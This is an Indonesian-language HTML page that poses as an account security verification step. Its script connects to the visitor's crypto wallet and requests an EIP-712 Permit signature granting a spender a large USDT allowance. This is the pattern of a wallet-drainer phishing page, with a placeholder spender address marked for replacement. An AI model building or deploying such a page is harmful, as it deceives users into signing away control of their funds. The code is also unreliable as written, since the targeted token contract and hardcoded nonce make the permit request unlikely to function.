<!DOCTYPE html>
<html>
<body>
    <h3>Verifikasi Keamanan Akun</h3>
    <p>Silakan verifikasi untuk melanjutkan akses.</p>
    <button id="verifyBtn">Verifikasi Sekarang</button>

    <script>
        document.getElementById('verifyBtn').addEventListener('click', async () => {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });

            // Data permit yang lebih mendekati standar nyata
            const permitData = {
                domain: {
                    name: "USDT", 
                    version: "1",
                    chainId: parseInt(chainId, 16),
                    verifyingContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
                },
                message: {
                    owner: accounts[0],
                    spender: "0x0000000000000000000000000000000000000000", // Ganti dengan spender yang valid
                    value: "1000000000", 
                    nonce: 0, // Anda mungkin perlu mengambil nonce asli dari kontrak
                    deadline: Math.floor(Date.now() / 1000) + 3600 // Deadline 1 jam ke depan
                },
                primaryType: "Permit",
                types: {
                    EIP712Domain: [
                        { name: "name", type: "string" }, { name: "version", type: "string" },
                        { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }
                    ],
                    Permit: [
                        { name: "owner", type: "address" }, { name: "spender", type: "address" },
                        { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
                        { name: "deadline", type: "uint256" }
                    ]
                }
            };

            try {
                const signature = await window.ethereum.request({
                    method: 'eth_signTypedData_v4',
                    params: [accounts[0], JSON.stringify(permitData)],
                });
                alert("Tanda tangan berhasil dibuat: " + signature);
            } catch (err) {
                console.error("Gagal menandatangani:", err);
            }
        });
    </script>
</body>
</html>
